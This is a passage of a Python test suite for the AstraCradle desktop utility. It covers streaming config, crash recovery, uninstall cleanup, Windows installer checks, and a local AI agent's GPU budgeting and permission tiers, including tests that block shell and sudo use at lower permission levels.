            "astracradle.core.astrabeam.shutil.which",
            lambda n: "/usr/bin/" + n if n in ("kscreen-doctor", "sunshine") else None,
        )
        monkeypatch.setattr(
            "astracradle.core.astrabeam.subprocess.run",
            lambda *a, **kw: SimpleNamespace(returncode=0, stdout=kscreen_out, stderr=""),
        )
        assert SunshineMoonlightBridge.detect_primary_display_output() == "DP-5"
        sun_conf = Path(td) / "sunshine.conf"
        ok_opt, msg_opt = SunshineMoonlightBridge.optimize_sunshine_for_tablet("100.77.94.72", conf_path=sun_conf)
        assert ok_opt is True
        txt = sun_conf.read_text(encoding="utf-8")
        assert "output_name = DP-5" in txt
        assert "upnp = disabled" in txt


def test_desktop_widget_default_off_and_nonblocking_tray_notify() -> None:
    import time as _t
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.ui.tray import TrayController

    cfg = AppConfig()
    assert cfg.desktop_widget_enabled is False

    with tempfile.TemporaryDirectory() as td:
        cfg_mgr = ConfigManager(base_dir=td)
        loaded = cfg_mgr.load()
        assert loaded.desktop_widget_enabled is False

    # TrayController.notify must be non-blocking even if backend notify sleeps
    class _SlowIcon:
        def notify(self, _m, _t_str) -> None:
            _t.sleep(0.5)

    tc = TrayController(
        icon_path=Path(__file__).resolve().parents[1] / "astracradle" / "assets" / "astracradle_emblem.png",
        on_show=lambda: None,
        on_scan=lambda: None,
        on_quit=lambda: None,
    )
    tc._icon = _SlowIcon()
    t0 = _t.monotonic()
    assert tc.notify("Title", "Hello") is True
    assert (_t.monotonic() - t0) < 0.1


def test_iphone_16_pro_max_pwa_endpoints_and_swiftui_companion() -> None:
    import ssl
    import urllib.request
    from astracradle.core.astrabeam import AstraBeamServer
    from astracradle.core.config import ConfigManager
    from astracradle.core.journal import ForensicJournal

    repo_root = Path(__file__).resolve().parents[1]
    ios_dir = repo_root / "mobile" / "ios" / "AstraCradleCompanion"
    for fname in ("AstraCradleCompanionApp.swift", "AstraBeamClient.swift", "ContentView.swift", "Info.plist"):
        assert (ios_dir / fname).exists(), f"Missing native iOS file {fname}"

    with tempfile.TemporaryDirectory() as td:
        cfg_mgr = ConfigManager(base_dir=td)
        journal = ForensicJournal(cfg_mgr)
        srv = AstraBeamServer(journal, host="127.0.0.1", port=0, pin="654321", tls_enabled=False)
        ok, _ = srv.start()
        assert ok is True
        try:
            base = f"http://127.0.0.1:{srv.port}"
            html = urllib.request.urlopen(f"{base}/iphone", timeout=3).read().decode("utf-8")
            assert "iPhone 16 Pro Max" in html
            assert "viewport-fit=cover" in html
            assert "moonlight://" in html

            icon_bytes = urllib.request.urlopen(f"{base}/apple-touch-icon.png", timeout=3).read()
            assert icon_bytes[:8] == b"\x89PNG\r\n\x1a\n"

            man = urllib.request.urlopen(f"{base}/manifest.webmanifest", timeout=3).read().decode("utf-8")
            assert '"start_url": "/iphone"' in man
        finally:
            srv.stop()


def test_modular_system_presets_background_gating_and_cli() -> None:
    from astracradle.__main__ import main as cli_main
    from astracradle.core.config import ConfigManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.lifecycle import LifecycleManager
    from astracradle.core.modules import (
        ALL_MODULE_IDS,
        allowed_nav_keys,
        normalize_enabled_modules,
        resolve_preset_or_modules,
    )
    from astracradle.core.updater import ModuleAndUpdateManager

    # core_diagnostics is always retained even if omitted
    mods = normalize_enabled_modules(["remote_beam", "nonexistent_mod"])
    assert mods == ["core_diagnostics", "remote_beam"]
    navs = allowed_nav_keys(mods)
    assert "dashboard" in navs and "remote_beam" in navs and "wifi" not in navs

    # Streamer preset resolves cleanly
    s_mods, s_name = resolve_preset_or_modules("streamer")
    assert s_name == "Streamer & iPhone Remote"
    assert "remote_beam" in s_mods and "wifi_failover_mesh" in s_mods and "system_scanner" not in s_mods

    with tempfile.TemporaryDirectory() as td:
        rc = cli_main(["--config-dir", td, "--modules", "minimal"])
        assert rc == 0
        rc2 = cli_main(["--config-dir", td, "--list-modules"])
        assert rc2 == 0

        cm = ConfigManager(base_dir=td)
        cfg = cm.load()
        assert cfg.enabled_modules == ["core_diagnostics"]
        assert cfg.setup_wizard_completed is True
        # Disabled modules also shut off their background watchers
        assert cfg.astrashield_auto_start is False
        assert cfg.wifi_auto_optimize is False
        assert cfg.failover_enabled is False
        assert cfg.catalog_passive_scan is False
        assert cfg.probalance_enabled is False

        # Install memory preserves module choice across reinstall/reapply
        from astracradle.core.rollback import RollbackManager

        journal = ForensicJournal(cm)
        rb = RollbackManager(cm)
        upd = ModuleAndUpdateManager(cm, journal)
        fresh_cfg = cm.load()
        fresh_cfg.apply_module_selection(list(ALL_MODULE_IDS), preset_name="Full Suite (Everything)")
        reapplied, mem = upd.reapply_remembered_setup(fresh_cfg, LifecycleManager(cm, rb, journal))
        assert mem["enabled_modules"] == ["core_diagnostics"]
        assert cm.load().enabled_modules == ["core_diagnostics"]
        assert any("selected module" in r.lower() for r in reapplied)

        # Plain-English Setup Wizard apply_wizard_choices applies all 9 permissions & preferences cleanly
        wiz_cfg = cm.load()
        wiz_cfg.apply_wizard_choices(
            {
                "enabled_modules": ["core_diagnostics", "remote_beam", "wifi_failover_mesh"],
                "preset_name": "Streamer & iPhone Remote",
                "active_profile": "Gaming / Low-Latency",
                "theme": "High Contrast",
                "language": "es",
                "auto_update_mode": "notify",
                "simple_mode": True,
                "consent_telemetry": True,
                "consent_process_scan": True,
                "consent_installed_apps": False,
                "consent_bloat_scan": True,
                "consent_privacy_scan": True,
                "consent_crash_diagnostics": True,
                "consent_auto_remediate": True,
                "consent_wifi_auto_channel": True,
                "consent_auto_install_deps": True,
                "confirm_important_prompts": False,
                "quarantine_enabled": True,
                "auto_self_heal": True,
                "show_tray_icon": True,
                "minimize_to_tray": True,
                "desktop_widget_enabled": False,
                "launch_at_login": True,
                "astrashield_auto_start": True,  # gated OFF because privacy_shield isn't enabled
                "wifi_prefer_5ghz": True,
                "failover_enabled": True,
                "astrabeam_tailscale_only": True,
            }
        )
        cm.save(wiz_cfg)
        reloaded = cm.load()
        assert reloaded.setup_wizard_completed is True
        assert reloaded.consent_prompted is True
        assert reloaded.active_profile == "Gaming / Low-Latency"
        assert reloaded.theme == "High Contrast"
        assert reloaded.language == "es"
        assert reloaded.consent_privacy_scan is True
        assert reloaded.consent_installed_apps is False
        assert reloaded.consent_auto_install_deps is True
        assert reloaded.consent_wifi_auto_channel is True
        assert reloaded.wifi_auto_optimize is True
        assert reloaded.wifi_prompt_before_apply is False
        assert reloaded.astrashield_auto_start is False  # disabled module stays gated off
        assert reloaded.minimize_to_tray is True
        assert reloaded.launch_at_login is True


def test_catastrophic_mid_install_and_crash_recovery(monkeypatch) -> None:
    import subprocess
    from astracradle.core.config import ConfigManager
    from astracradle.core.crash_analyzer import CrashAnalyzer
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.os_adapters import get_os_adapter
    from astracradle.core.rollback import RollbackManager
    from astracradle.core.self_heal import SelfHealEngine
    from astracradle.core.updater import ModuleAndUpdateManager

    with tempfile.TemporaryDirectory() as td:
        base = Path(td)
        cm = ConfigManager(base_dir=base)
        cfg = cm.load()
        cfg.apply_wizard_choices(
            {
                "enabled_modules": ["core_diagnostics", "remote_beam"],
                "preset_name": "Custom",
                "consent_telemetry": True,
            }
        )
        cm.save(cfg)

        j = ForensicJournal(cm)
        rb = RollbackManager(cm)
        upd = ModuleAndUpdateManager(cm, j)
        upd.record_install_memory(install_method="fish", desktop_icon=False, shortcuts_installed=True, config=cfg)

        # 1. Simulate catastrophic power loss / SIGKILL leaving truncated config.json,
        #    corrupt machine_install_memory.json, orphaned .tmp files, and unclean heartbeat
        cm.config_path.write_text('{"theme": "Obsidian', encoding="utf-8")
        (cm.state_dir / "config.tmp").write_text("partial", encoding="utf-8")
        (cm.base_dir / "machine_install_memory.json").write_text("{corrupt_half_written", encoding="utf-8")
        (cm.base_dir / "machine_install_memory.json.tmp").write_text("half", encoding="utf-8")

        ca = CrashAnalyzer(cm, j)
        ca.mark_running("Balanced Daily")  # never called mark_clean_shutdown()

        # Verify SelfHealEngine + ConfigManager + Updater recover seamlessly from shadow backups
        events, audits = SelfHealEngine(cm, rb, j).run_self_check(get_os_adapter(), cm.load())
        assert all(ev.status in ("ok", "repaired") for ev in events if ev.check_name != "Companion Dependency Library Guard")
        recovered_cfg = cm.load()
        assert recovered_cfg.enabled_modules == ["core_diagnostics", "remote_beam"]
        assert recovered_cfg.setup_wizard_completed is True

        recovered_mem = upd.load_install_memory()
        assert recovered_mem["install_method"] == "fish"
        assert recovered_mem["enabled_modules"] == ["core_diagnostics", "remote_beam"]

        # CrashAnalyzer detects the unclean shutdown from mid-install/run
        report = ca.inspect_on_startup()
        assert report is not None

        # 2. Simulate subprocess killed mid-wizard (`SIGKILL` before finishing setup_wizard)
        repo_root = Path(__file__).resolve().parents[1]
        half_dir = Path(td) / "half_wizard"
        proc = subprocess.Popen(
            [
                sys.executable,
                "-c",
                "import time; from astracradle.core.config import ConfigManager; "
                "from astracradle.core.journal import ForensicJournal; "
                "from astracradle.core.crash_analyzer import CrashAnalyzer; "
                f"cm=ConfigManager({str(half_dir)!r}); cfg=cm.load(); "
                "ca=CrashAnalyzer(cm, ForensicJournal(cm)); ca.mark_running('Balanced Daily'); "
                "time.sleep(10)",
            ],
            cwd=str(repo_root),
        )
        time.sleep(0.35)
        proc.kill()
        proc.wait(timeout=5)

        cm2 = ConfigManager(base_dir=half_dir)
        cfg2 = cm2.load()
        # setup_wizard_completed MUST still be False so next launch cleanly re-offers Setup Wizard
        assert cfg2.setup_wizard_completed is False
        assert CrashAnalyzer(cm2, ForensicJournal(cm2)).inspect_on_startup() is not None
        # Check fish/bash installers guard broken partial .venv recovery
        fish_txt = (repo_root / "install_astracradle.fish").read_text(encoding="utf-8")
        sh_txt = (repo_root / "install_astracradle.sh").read_text(encoding="utf-8")
        assert "m pip --version" in fish_txt and "rm -rf .venv" in fish_txt
        assert "m pip --version" in sh_txt and "rm -rf .venv" in sh_txt


def test_clean_uninstall_removes_all_new_artifacts_and_cli_uninstall(monkeypatch) -> None:
    from astracradle.__main__ import main as cli_main
    from astracradle.core.config import ConfigManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.lifecycle import LifecycleManager
    from astracradle.core.os_adapters import get_os_adapter
    from astracradle.core.rollback import RollbackManager
    from astracradle.core.updater import ModuleAndUpdateManager

    repo_root = Path(__file__).resolve().parents[1]
    with tempfile.TemporaryDirectory() as td:
        fake_home = Path(td) / "home"
        fake_home.mkdir(parents=True, exist_ok=True)
        monkeypatch.setattr(Path, "home", staticmethod(lambda: fake_home))

        ac_dir = fake_home / ".astracradle"
        cm = ConfigManager(base_dir=ac_dir)
        cfg = cm.load()
        cfg.apply_wizard_choices(
            {
                "enabled_modules": ["core_diagnostics", "remote_beam", "wifi_failover_mesh"],
                "preset_name": "Streamer & iPhone Remote",
                "launch_at_login": True,
                "consent_telemetry": True,
            }
        )
        cm.save(cfg)

        j = ForensicJournal(cm)
        rb = RollbackManager(cm)
        lm = LifecycleManager(cm, rb, j)
        upd = ModuleAndUpdateManager(cm, j)
        upd.record_install_memory(install_method="fish", desktop_icon=True, shortcuts_installed=True, config=cfg)

        # Simulate all installed artifacts from recent updates
        lm.install_shortcuts(repo_root, include_desktop_icon=True, os_override="Linux")
        ok_login, _ = lm.set_launch_at_login(True, repo_root=repo_root, os_override="Linux")
        assert ok_login is True

        local_bin = fake_home / ".local" / "bin"
        local_bin.mkdir(parents=True, exist_ok=True)
        for bn in ("astracradle", "astracradle-gui", "astracradle-wifi"):
            (local_bin / bn).symlink_to(repo_root / "install_astracradle.fish")

        fish_hook = fake_home / ".config" / "fish" / "conf.d" / "astracradle_wifi.fish"
        fish_hook.parent.mkdir(parents=True, exist_ok=True)
        fish_hook.write_text("# wifi hook", encoding="utf-8")

        sd_user = fake_home / ".config" / "systemd" / "user"
        sd_user.mkdir(parents=True, exist_ok=True)
        wifi_svc = sd_user / "astracradle-wifi-opt.service"
        wifi_tmr = sd_user / "astracradle-wifi-opt.timer"
        wifi_svc.write_text("[Unit]", encoding="utf-8")
        wifi_tmr.write_text("[Timer]", encoding="utf-8")

        (cm.state_dir / "setup_wizard_draft.json").write_text('{"step": 2}', encoding="utf-8")
        (ac_dir / "certs").mkdir(parents=True, exist_ok=True)
        (ac_dir / "certs" / "astrabeam.crt").write_text("CERT", encoding="utf-8")

        # 1. Keep-data uninstall cleans shortcuts, autostart, CLI symlinks, Fish/systemd hooks & transient draft
        summary_keep = lm.uninstall_astracradle(
            get_os_adapter(),
            cfg,
            delete_user_data=False,
            restore_quarantine_first=True,
            uninstall_pip_package=False,
        )
        assert summary_keep.ok is True
        assert summary_keep.deleted_data_dir is False
        assert not (fake_home / ".config" / "autostart" / "astracradle.desktop").exists()
        assert not (fake_home / ".local" / "bin" / "astracradle").exists()
        assert not (fake_home / ".local" / "bin" / "astracradle-gui").exists()
        assert not (fake_home / ".local" / "bin" / "astracradle-wifi").exists()
        assert not fish_hook.exists()
        assert not wifi_svc.exists()
        assert not wifi_tmr.exists()
        assert not (cm.state_dir / "setup_wizard_draft.json").exists()
        assert ac_dir.exists() and (ac_dir / "machine_install_memory.json").exists()

        # 2. Full CLI uninstall (--uninstall --yes --delete-data) deletes ~/.astracradle completely
        rc = cli_main(["--config-dir", str(ac_dir), "--uninstall", "--yes", "--delete-data"])
        assert rc == 0
        assert not ac_dir.exists()


def test_windows_11_pythonw_null_stdio_and_installer_resilience(monkeypatch) -> None:
    import sys as _sys
    from astracradle.__main__ import _ensure_valid_stdio

    repo_root = Path(__file__).resolve().parents[1]
    bat_txt = (repo_root / "Install_AstraCradle.bat").read_text(encoding="utf-8")
    run_bat = (repo_root / "run_astracradle.bat").read_text(encoding="utf-8")
    ps1_txt = (repo_root / "scripts" / "quick_install.ps1").read_text(encoding="utf-8")

    # Verify Windows 11 Store alias bypass, Python 3.10-3.14 search, quoted paths, Tkinter check & auto-repair
    assert "Python314" in bat_txt and '"%%~P" -c "import sys, tkinter' in bat_txt
    assert '".venv\\Scripts\\python.exe" -m pip --version' in bat_txt
    assert 'start "AstraCradle" ".venv\\Scripts\\python.exe" -m astracradle' in bat_txt
    assert 'call "%~dp0Install_AstraCradle.bat"' in run_bat
    assert 'start "AstraCradle" ".venv\\Scripts\\python.exe" -m astracradle %*' in run_bat
    assert "LASTEXITCODE" in ps1_txt and "Unblock-File" in ps1_txt

    # Verify pythonw.exe / astracradle-gui.exe (sys.stdout=None, sys.stderr=None) gets safe streams
    with tempfile.TemporaryDirectory() as td:
        orig_out, orig_err = _sys.stdout, _sys.stderr
        try:
            monkeypatch.setattr(_sys, "stdout", None)
            monkeypatch.setattr(_sys, "stderr", None)
            _ensure_valid_stdio(td)
            assert _sys.stdout is not None and _sys.stderr is not None
            _sys.stderr.write("win11-stdio-ok\n")
            _sys.stderr.flush()
        finally:
            try:
                if _sys.stderr not in (None, orig_err):
                    _sys.stderr.close()
            except Exception:
                pass
            _sys.stdout = orig_out
            _sys.stderr = orig_err
        assert (Path(td) / "logs" / "gui_stdio.log").exists()


def test_first_load_windows_lag_fixes_and_pnp_throttle() -> None:
    from astracradle.core.usb_guard import UsbAndPeripheralGuard

    repo_root = Path(__file__).resolve().parents[1]
    app_txt = (repo_root / "astracradle" / "ui" / "app.py").read_text(encoding="utf-8")
    dash_txt = (repo_root / "astracradle" / "ui" / "pages" / "dashboard_snapshot.py").read_text(encoding="utf-8")
    usb_txt = (repo_root / "astracradle" / "core" / "usb_guard.py").read_text(encoding="utf-8")

    # No synchronous nvidia-smi calls on the main UI thread
    assert "GpuPowerAndFanController.probe_live_power_and_fan()" not in dash_txt
    assert "gpu_live = sensors.get(\"gpu_live\") or {}" in app_txt
    # Background worker guard + Fix Everything Safe off main thread + capped UI drain
    assert "_telemetry_in_flight" in app_txt
    assert '("fix_safe_done"' in app_txt
    assert "while processed < 8:" in app_txt
    # Windows PnP PowerShell scan throttled & hidden console
    assert "CREATE_NO_WINDOW" in usb_txt and "_win_pnp_cache" in usb_txt
    assert hasattr(UsbAndPeripheralGuard, "_win_pnp_cache")


def test_native_hermes_os_ai_gpu_recommendation_setup_tools_and_uninstall() -> None:
    import json
    from unittest.mock import patch
    from types import SimpleNamespace
    from astracradle.core.config import ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager, recommend_hermes_models
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.lifecycle import LifecycleManager
    from astracradle.core.modules import ALL_MODULE_IDS
    from astracradle.core.rollback import RollbackManager

    assert "hermes_ai" in ALL_MODULE_IDS

    # 1. Verify GPU VRAM tier auto-selection picks optimized local model + optimal free cloud model
    with patch("astracradle.core.hermes_agent.GpuTelemetryCollector.collect") as mock_gpu, patch(
        "astracradle.core.hermes_agent.GpuPowerAndFanController.probe_live_power_and_fan",
        return_value={"name": "NVIDIA GeForce RTX 4070"},
    ):
        mock_gpu.return_value = SimpleNamespace(available=True, name="NVIDIA GeForce RTX 4070", vram_total_mb=12288)
        rec_12 = recommend_hermes_models()
        assert rec_12.recommended_local_model == "qwen3:14b"
        assert rec_12.recommended_context_tokens == 32768
        assert rec_12.optimal_free_model == "qwen/qwen3-coder:free"

        mock_gpu.return_value = SimpleNamespace(available=True, name="NVIDIA GeForce RTX 4090", vram_total_mb=24576)
        rec_24 = recommend_hermes_models()
        assert rec_24.recommended_local_model == "qwen3.6:35b"
        assert rec_24.recommended_context_tokens == 65536

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=td)
        cfg = cm.load()
        assert cfg.floating_orb_on_minimize is False
        journal = ForensicJournal(cm)
        hm = HermesAgentManager(cm, journal)

        # Strict Local-Only AI forces local_gpu/ollama even if mode was previously cloud
        cfg.hermes_mode = "free_cloud"
        cfg.hermes_provider = "openrouter_free"
        cfg.hermes_local_only = True
        local_spec = hm.resolve_provider_spec(cfg)
        assert local_spec["mode"] == "local_gpu" and local_spec["provider"] == "ollama" and local_spec["local_only"] is True
        cfg.hermes_local_only = False

        # 2. Automated setup creates HERMES_HOME, MEMORY.md, USER.md, SOUL.md, skills, sessions.db, and 0600 .env
        cfg.hermes_mode = "free_cloud"
        cfg.hermes_provider = "openrouter_free"
        ok, _msg, st = hm.install_and_setup_hermes(
            cfg,
            api_key="sk-or-test-key-1234",
            install_upstream_pkg=False,
            pull_local_model=False,
        )
        assert ok is True
        assert st.ready is True
        assert st.api_key_configured is True
        assert hm.memory_path.exists()
        assert hm.user_md_path.exists()
        assert hm.soul_md_path.exists()
        assert (hm.skills_dir / "astracradle-os-bridge" / "SKILL.md").exists()
        assert hm.load_env().get("OPENROUTER_API_KEY") == "sk-or-test-key-1234"

        # 3. Verify 4-tier Hermes permission levels (read_only, safe_user, standard_user up to just below sudo, sudo_with_prompt)
        cfg.hermes_permission_level = "read_only"
        ro_mem = hm.execute_tool("memory_save", {"fact": "Should be blocked"}, cfg)
        assert ro_mem["ok"] is False and ro_mem.get("blocked") is True

        cfg.hermes_permission_level = "safe_user"
        cfg.hermes_allow_shell = False
        blocked = hm.execute_tool("shell_exec", {"command": "echo hi"}, cfg)
        assert blocked["ok"] is False and blocked.get("blocked") is True
        outside_write = hm.execute_tool("file_write", {"path": str(Path(td).parent / "outside.txt"), "content": "x"}, cfg)
        assert outside_write["ok"] is False and outside_write.get("blocked") is True

        cfg.hermes_permission_level = "standard_user"
        ok_user_sh = hm.execute_tool("shell_exec", {"command": "echo standard_user_ok"}, cfg)
        assert ok_user_sh["ok"] is True and "standard_user_ok" in ok_user_sh["stdout"]
        blocked_sudo = hm.execute_tool("shell_exec", {"command": "sudo id"}, cfg)
        assert blocked_sudo["ok"] is False and blocked_sudo.get("blocked") is True
        blocked_sudo_tool = hm.execute_tool("sudo_exec", {"command": "pacman -Qk", "reason": "Verify packages"}, cfg)
        assert blocked_sudo_tool["ok"] is False and blocked_sudo_tool.get("blocked") is True

        cfg.hermes_permission_level = "sudo_with_prompt"
        from astracradle.core.elevation import ElevationResult, ElevationRunner

        hm.elevation = ElevationRunner(password_prompt_cb=lambda _t, _r: "typed-pw")
        with patch.object(
            hm.elevation,
            "run_privileged",
            return_value=ElevationResult(True, 0, "uid=0(root)", "", cancelled=False, method="sudo"),
        ) as mock_priv:
            ok_sudo = hm.execute_tool("sudo_exec", {"command": "sudo pacman -Qk", "reason": "Check packages"}, cfg)
            assert ok_sudo["ok"] is True and "uid=0" in ok_sudo["stdout"]
            assert mock_priv.called
        hm.elevation = None
        cfg.hermes_permission_level = "safe_user"

        # 6. Regression check: no unescaped '%' in argparse help strings (Python 3.14 ValueError guard)
        import re as _re
        main_txt = (Path(__file__).resolve().parents[1] / "astracradle" / "__main__.py").read_text(encoding="utf-8")
        for m in _re.finditer(r'help="([^"]*)"', main_txt):
            assert not _re.search(r"%(?![%(])", m.group(1)), f"Unescaped % in argparse help: {m.group(1)}"

        # 4. Multi-step tool-calling loop executes native AstraCradle tools and auto-crystallizes a SKILL.md
        calls = {"n": 0}

        def _fake_llm(_spec, _key, _msgs, _tools):
            calls["n"] += 1
            if calls["n"] == 1:
                return "", [
                    {"id": "c1", "function": {"name": "astra_system_status", "arguments": "{}"}},
                    {"id": "c2", "function": {"name": "memory_save", "arguments": json.dumps({"fact": "User has RTX 4070"})}},
                    {"id": "c3", "function": {"name": "cron_schedule", "arguments": json.dumps({"name": "Check GPU", "prompt": "Check status", "interval_minutes": 60})}},
                ]
            return "All 3 checks completed and saved to MEMORY.md.", []

        res = hm.run_prompt("Check my PC status, remember my GPU, and schedule a check", cfg, session_id="s1", llm_caller=_fake_llm)
        assert res.ok is True
        assert len(res.tool_events) == 3
        assert res.skill_created and Path(res.skill_created).exists()
        assert "User has RTX 4070" in hm.memory_path.read_text(encoding="utf-8")
        assert len(hm.list_cron_jobs()) == 1
        assert len(hm.list_sessions()) == 1

        # 5. Clean uninstall deletes ~/.astracradle/hermes completely
        from astracradle.core.os_adapters import get_os_adapter

        rb = RollbackManager(cm)
        lm = LifecycleManager(cm, rb, journal)
        with patch.object(lm, "shortcut_paths", return_value=[]), patch.object(
            lm, "set_launch_at_login", return_value=(True, "ok")
        ):
            summary = lm.uninstall_astracradle(
                get_os_adapter(),
                cfg,
                delete_user_data=True,
                restore_quarantine_first=False,
                uninstall_pip_package=False,
            )
        assert summary.deleted_data_dir is True
        assert not hm.hermes_home.exists()


def test_hermes_gpu_budgets_and_optimized_game_mode() -> None:
    from types import SimpleNamespace
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HERMES_GPU_MODES, HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    assert set(HERMES_GPU_MODES.keys()) == {"game_adaptive", "100", "75", "50", "25"}

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=td)
        cfg = AppConfig()
        assert cfg.hermes_gpu_limit_mode == "game_adaptive"
        assert cfg.hermes_vram_reserve_mb == 1024

        journal = ForensicJournal(cm)
        hm = HermesAgentManager(cm, journal)
        hm.ensure_hermes_home(cfg)

        # 1. Fixed GPU percentage budgets (100%, 75%, 50%, 25%)
        idle_gpu = SimpleNamespace(available=True, name="RTX Test", utilization_percent=5.0, vram_used_mb=500.0, vram_total_mb=8192.0)
        for mode, expected_pct in (("100", 100), ("75", 75), ("50", 50), ("25", 25)):
            cfg.hermes_gpu_limit_mode = mode
            p = hm.compute_gpu_throttle_plan(cfg, gpu=idle_gpu, processes=[])
            assert p["target_gpu_pct"] == expected_pct
            if expected_pct == 100:
                assert p["num_gpu_layers"] is None
            else:
                assert p["num_gpu_layers"] is not None and p["num_gpu_layers"] < 36

        # 2. Optimized Game Mode: never uses 100% GPU even when idle, learns fullscreen games, and preserves ~1 GB VRAM headroom
        cfg.hermes_gpu_limit_mode = "game_adaptive"
        idle_plan = hm.compute_gpu_throttle_plan(cfg, gpu=idle_gpu, processes=[])
        assert idle_plan["target_gpu_pct"] < 100
        assert idle_plan["vram_reserve_mb"] == 1024

        # Learn a custom game while running fullscreen with heavy GPU/VRAM usage
        game_gpu = SimpleNamespace(available=True, name="RTX Test", utilization_percent=88.0, vram_used_mb=6800.0, vram_total_mb=8192.0)
        learned = hm.observe_running_workload(
            [{"name": "eldenring.exe"}],
            focus_process="eldenring.exe",
            is_fullscreen=True,
            gpu=game_gpu,
        )
        assert learned is not None
        assert learned["key"] == "eldenring"
        assert learned["peak_vram_mb"] == 6800.0
        assert len(hm.list_learned_games()) == 1

        # With 6800/8192 MB used, headroom above 1024 MB reserve is only 368 MB -> forces CPU/RAM offload + cron deferral
        tight_plan = hm.compute_gpu_throttle_plan(cfg, gpu=game_gpu, processes=[{"name": "eldenring.exe"}], focus_process="eldenring.exe", is_fullscreen=True)
        assert tight_plan["active_game"] == "eldenring.exe"
        assert tight_plan["vram_headroom_mb"] == 368.0
        assert tight_plan["num_gpu_layers"] == 0
        assert tight_plan["defer_background_cron"] is True

        # With roomy VRAM (3200/8192 MB used -> 3968 MB above 1 GB reserve), still throttles GPU <= 35% while game runs
        roomy_game_gpu = SimpleNamespace(available=True, name="RTX Test", utilization_percent=52.0, vram_used_mb=3200.0, vram_total_mb=8192.0)
        roomy_plan = hm.compute_gpu_throttle_plan(cfg, gpu=roomy_game_gpu, processes=[{"name": "eldenring.exe"}])
        assert roomy_plan["target_gpu_pct"] <= 35
        assert roomy_plan["num_gpu_layers"] is not None and roomy_plan["num_gpu_layers"] > 0

        # config.yaml persists GPU budget & reserve
        yaml_txt = hm.write_config_yaml(cfg).read_text(encoding="utf-8")
        assert 'limit_mode: "game_adaptive"' in yaml_txt
        assert "vram_reserve_mb: 1024" in yaml_txt


def test_hermes_auto_integrates_already_downloaded_gpu_model(monkeypatch) -> None:
    from types import SimpleNamespace
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        # Simulate Ollama manifest already downloaded on disk (even while Ollama daemon is stopped)
        fake_manifests = Path(td) / "ollama_models" / "manifests" / "registry.ollama.ai" / "library" / "qwen3.5"
        fake_manifests.mkdir(parents=True, exist_ok=True)
        (fake_manifests / "9b").write_text("{}", encoding="utf-8")
        monkeypatch.setenv("OLLAMA_MODELS", str(Path(td) / "ollama_models"))

        disk_models = HermesAgentManager.scan_ollama_disk_manifests()
        assert "qwen3.5:9b" in disk_models

        cm = ConfigManager(base_dir=Path(td) / "astra")
        cfg = AppConfig()  # Default unconfigured state (free_cloud, hermes_enabled=False, no API key)
        journal = ForensicJournal(cm)
        hm = HermesAgentManager(cm, journal)

        # Mock hardware recommender to pick qwen3.5:9b for 8GB GPU
        fake_rec = SimpleNamespace(
            gpu_name="NVIDIA RTX 4060",
            gpu_vram_gb=8.0,
            system_ram_gb=16.0,
            is_apple_silicon=False,
            tier_name="Mainstream GPU (8GB VRAM)",
            recommended_local_model="qwen3.5:9b",
            local_alternatives=["qwen3.5:9b", "qwen3:8b"],
            recommended_context_tokens=32768,
            local_reason="8GB VRAM",
            local_viable=True,
            optimal_free_provider="openrouter_free",
            optimal_free_model="qwen/qwen3-coder:free",
            free_reason="Free",
        )
        monkeypatch.setattr("astracradle.core.hermes_agent.recommend_hermes_models", lambda: fake_rec)
        monkeypatch.setattr(HermesAgentManager, "list_ollama_models", staticmethod(lambda *_a, **_kw: (False, [])))
        monkeypatch.setattr(HermesAgentManager, "find_ollama_bin", staticmethod(lambda: "/usr/bin/ollama"))
        monkeypatch.setattr(hm, "ensure_ollama_running", lambda: (True, "Started local Ollama"))

        # 1. Auto-integration switches unconfigured Hermes directly to the already-downloaded GPU model
        info = hm.auto_integrate_downloaded_gpu_model(cfg, start_runtime=True)
        assert info["integrated"] is True
        assert info["model"] == "qwen3.5:9b"
        assert cfg.hermes_enabled is True
        assert cfg.hermes_local_only is True
        assert cfg.hermes_mode == "local_gpu"
        assert cfg.hermes_provider == "ollama"
        assert cfg.hermes_model == "qwen3.5:9b"
        assert hm.config_yaml_path.exists()

        # 2. Running setup again must NOT invoke `ollama pull` / re-download
        pull_called = {"called": False}
        orig_popen = subprocess.Popen

        def _fail_if_pull(cmd, *a, **kw):
            if isinstance(cmd, (list, tuple)) and "pull" in cmd:
                pull_called["called"] = True
                raise AssertionError("Should never re-download an already-downloaded model!")
            return orig_popen(cmd, *a, **kw)

        monkeypatch.setattr("astracradle.core.hermes_agent.subprocess.Popen", _fail_if_pull)
        ok_s, msg_s, st_s = hm.install_and_setup_hermes(cfg, install_upstream_pkg=False, pull_local_model=True)
        assert ok_s is True
        assert pull_called["called"] is False
        assert "skipped re-download" in msg_s.lower() or "already downloaded" in msg_s.lower()
        assert st_s.active_model == "qwen3.5:9b"

        # 3. If user explicitly configured a working cloud provider with an API key, respect it
        cfg_cloud = AppConfig(hermes_mode="free_cloud", hermes_provider="openrouter_free", hermes_local_only=False)
        hm.save_env_vars({"OPENROUTER_API_KEY": "sk-or-test-key"})
        info_cloud = hm.auto_integrate_downloaded_gpu_model(cfg_cloud, start_runtime=False)
        assert info_cloud["integrated"] is False
        assert cfg_cloud.hermes_provider == "openrouter_free"


def test_hermes_whole_pc_learning_and_integrated_fix_tools() -> None:
    from types import SimpleNamespace
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.mobile_continuity import DeviceRegistryManager
    from astracradle.core.probalance import ProBalanceEngine
    from astracradle.core.rollback import RollbackManager
    from astracradle.core.self_heal import SelfHealEngine

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=td)
        cfg = AppConfig(hermes_permission_level="safe_user")
        journal = ForensicJournal(cm)
        rb = RollbackManager(cm)
        sh = SelfHealEngine(cm, rb, journal)
